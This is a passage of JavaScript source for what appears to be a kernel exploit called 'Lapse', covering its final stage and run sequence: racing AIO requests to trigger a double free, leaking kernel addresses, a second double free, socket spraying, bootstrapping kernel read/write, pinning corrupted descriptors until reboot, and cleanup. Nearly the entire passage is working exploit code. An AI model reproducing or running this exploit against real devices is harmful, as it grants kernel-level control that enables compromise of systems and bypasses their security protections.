        this.checkpoint("quarantine-start", "Pinning helper transport", true);
        try {
            var helperFds = [this.ipv6Rw.pipeReadFd,
                this.ipv6Rw.pipeWriteFd, this.ipv6Rw.masterSock,
                this.ipv6Rw.victimSock].concat(this.restrictedTransportFds);
            if (this.restrictedTransportFds.length !== 3)
                throw new Error("lapse: restricted transport inventory is incomplete");
            var uniqueFds = [];
            var holds = [];
            for (var i = 0; i < helperFds.length; ++i) {
                var fd = helperFds[i];
                if (!Number.isInteger(fd) || fd < 0
                        || uniqueFds.indexOf(fd) !== -1)
                    continue;
                uniqueFds.push(fd);
                holds.push(this.holdFile(fd));
            }
            if (uniqueFds.length !== helperFds.length || holds.length !== 7)
                throw new Error("lapse: helper transport descriptors are not distinct");
            var transport = this.ipv6Rw.quarantine(holds);
            this.fast = false;
            this.sealed = true;
            this.dirty = false;
            this.rebootRequired = false;
            this.resourcePolicy.retainAllocator = false;
            this.resourcePolicy.retainMemory = false;
            this.resourcePolicy.closeSafe = false;
            this.resourcePolicy.payloadDeliverySafe = true;
            this.resourcePolicy.retainedUntilReboot = true;
            this.attemptDiagnostics.seal = {
                verified: true,
                strategy: transport.strategy,
                heldDescriptors: holds.length,
                pipeHeadMode: transport.pipeHeadMode,
                pipeTailVerified: transport.pipeTailVerified,
                tailRestores: transport.tailRestores,
                quarantineVerifications: transport.quarantineVerifications,
                socketTransportDisarmed: transport.socketTransportDisarmed
            };
            this.sealResult = Object.freeze({
                strategy: transport.strategy,
                heldDescriptors: holds.length,
                pipeHeadMode: transport.pipeHeadMode,
                pipeTailVerified: transport.pipeTailVerified,
                tailRestores: transport.tailRestores,
                quarantineVerifications: transport.quarantineVerifications,
                socketTransportDisarmed: transport.socketTransportDisarmed,
                repairEntries: this.repairJournal.length
            });
            this.checkpoint("quarantined",
                "Helper transport pinned until reboot", true);
            return this.sealResult;
        } catch (error) {
            this.rebootRequired = true;
            this.attemptDiagnostics.seal = {
                verified: false,
                error: error && error.message ? error.message : String(error)
            };
            throw error;
        }
    };

    // =====================================================================
    // Run and cleanup
    // =====================================================================

    LapseKernel.prototype.minimalCleanup = function () {
        var warnings = [];
        try {
            warnings.push.apply(warnings, this.restoreMainThread());
        } catch (error) {
            warnings.push("main-thread scheduling restore: "
                + (error && error.message ? error.message : String(error)));
        }
        return warnings;
    };

    LapseKernel.prototype.fullCleanup = function () {
        if (this.cleanupDone) return [];

        var self = this;
        var warnings = [];
        function attempt(label, callback) {
            try {
                callback();
            } catch (error) {
                warnings.push(label + ": " + error.message);
            }
        }
        function closeTracked(property, label) {
            var fd = self[property];
            if (fd < 0) return;
            attempt(label, function () {
                self.closeStrict(fd, label);
                self[property] = -1;
            });
        }

        // Releasing the socketpair wakes the two blocked AIO workers before
        // their group is waited and deleted.
        closeTracked("blockFd", "blocking AIO socket");
        closeTracked("unblockFd", "blocking AIO peer");

        if (this.groomIds && this.groomIdCount > 0) {
            attempt("groom AIO cleanup", function () {
                if (self.groomCancelled)
                    self.freeAios2(self.groomIds, self.groomIdCount);
                else
                    self.freeAios(self.groomIds, self.groomIdCount, true);
                self.groomIds = null;
                self.groomIdCount = 0;
                self.groomCancelled = false;
            });
        }

        if (this.blockId !== null) {
            attempt("blocking AIO cleanup", function () {
                var blockIdBuf = self.alloc(4, 4,
                    "lapse-cleanup-block-id");
                var blockError = self.alloc(4, 4,
                    "lapse-cleanup-block-error");
                blockIdBuf.put32(0, self.blockId);
                blockError.put32(0, 0xFFFFFFFF);
                self.aioMultiWait(blockIdBuf, 1, blockError, 1, null);
                self.aioMultiDelete(blockIdBuf, 1, blockError);
                self.blockId = null;
            });
        }

        function closePool(pool, label) {
            for (var i = 0; i < pool.length; ++i) {
                if (pool[i] < 0) continue;
                (function (index, fd) {
                    attempt(label + " " + index, function () {
                        self.closeStrict(fd, label + " " + index);
                        pool[index] = -1;
                    });
                })(i, pool[i]);
            }
        }
        closePool(this.sds, "spray socket");
        closePool(this.sdsAlt, "alternate socket");

        attempt("main-thread scheduling restore", function () {
            warnings.push.apply(warnings, self.restoreMainThread());
        });
        if (warnings.length) {
            var cleanupError = new Error(warnings.join("; "));
            cleanupError.cleanupWarnings = warnings.slice();
            throw cleanupError;
        }
        this.cleanupDone = true;
        return warnings;
    };

    LapseKernel.prototype.safeCleanup = function () {
        return this.cleanupSafe
            ? this.fullCleanup() : this.minimalCleanup();
    };

    LapseKernel.prototype.run = function () {
        try {
            this.checkpoint("config", this.configDetail(), true);
            this.checkpoint("prepare-start", "Setting up AIO", true);
            this.prepare();
            this.checkpoint("race-start", "Racing AIO requests", true);
            this.triggerDoubleFree();
            this.checkpoint("leak-start", "Leaking kernel addresses", true);
            this.leakKernelAddresses();
            this.recordDeferredCheckpoint(DEFERRED_RECLAIM_START, 0, 0, 0);
            this.triggerSecondDoubleFree();
            this.recordDeferredCheckpoint(DEFERRED_RW_START, 0, 0, 0);
            this.bootstrapKernelRw();
            this.checkpoint("cleanup-start", "Releasing Lapse resources", true);
            this.fullCleanup();
            this.checkpoint("complete", "Kernel R/W established", true);
            return this;
        } catch (cause) {
            var cleanupWarnings = [];
            try {
                var returnedWarnings = this.safeCleanup();
                if (Array.isArray(returnedWarnings))
                    cleanupWarnings.push.apply(cleanupWarnings,
                        returnedWarnings.map(String));
            } catch (error) {
                if (error && Array.isArray(error.cleanupWarnings))
                    cleanupWarnings.push.apply(cleanupWarnings,
                        error.cleanupWarnings.map(String));
                else
                    cleanupWarnings.push(error && error.message
                        ? error.message : String(error));
                this.rebootRequired = true;
            }
            // Human-readable journal materialization is permitted only after
            // the terminal cleanup attempt has completed.
            this.deferredCheckpointPublishSafe = true;
            this.materializeSlowCurprocDiagnostics();
            this.materializeDeferredTerminalStage();
            this.publishDeferredCheckpoints();
            this.preDirtyCleanupVerified = !this.dirty
                && this.cleanupSafe
                && this.cleanupDone === true
                && cleanupWarnings.length === 0;
            this.attemptDiagnostics.cleanupWarnings = cleanupWarnings.slice();
            this.attemptDiagnostics.preDirtyCleanupVerified
                = this.preDirtyCleanupVerified;
            if (this.dirty) this.rebootRequired = true;
            if (cleanupWarnings.length) this.rebootRequired = true;
            if (this.dirty) this.publishUnsafe();
            if (this.preDirtyCleanupVerified) {
                // Preparation errors and ordinary race misses never crossed
                // the double-delete boundary.  Their complete cleanup was
                // verified, so retaining the allocator/memory cannot improve
                // safety and only leaks userland resources until navigation.
                this.attemptDiagnostics.safeFailure = true;
                this.resourcePolicy.retainAllocator = false;
                this.resourcePolicy.retainMemory = false;
                this.resourcePolicy.closeSafe = true;
            }
            var causeMessage = cause && cause.message
                ? cause.message : String(cause);
            if (this.attemptDiagnostics.slowCurproc
                    && this.attemptDiagnostics.slowCurproc.failureDetail)
                causeMessage += this.attemptDiagnostics.slowCurproc.failureDetail;
            var message = cleanupWarnings.length
                ? causeMessage + "; cleanup warnings: "
                    + cleanupWarnings.join("; ")
                : causeMessage;
            var failure = new Error(
                "LapseKernel at " + this.stage + ": " + message);
            failure.cleanupWarnings = cleanupWarnings.slice();
            failure.rollbackVerified = this.preDirtyCleanupVerified;
            throw failure;
        }
    };

    NS.LapseKernel = LapseKernel;
    NS.LapseConfig = DEFAULT_LAPSE_CONFIG;
    if (typeof module !== "undefined" && module.exports)
        module.exports = {
            LapseKernel: LapseKernel,
            LapseConfig: DEFAULT_LAPSE_CONFIG,
            LapseConfigFingerprint: DEFAULT_CONFIG_FINGERPRINT
        };
})(typeof globalThis !== "undefined" ? globalThis : this);
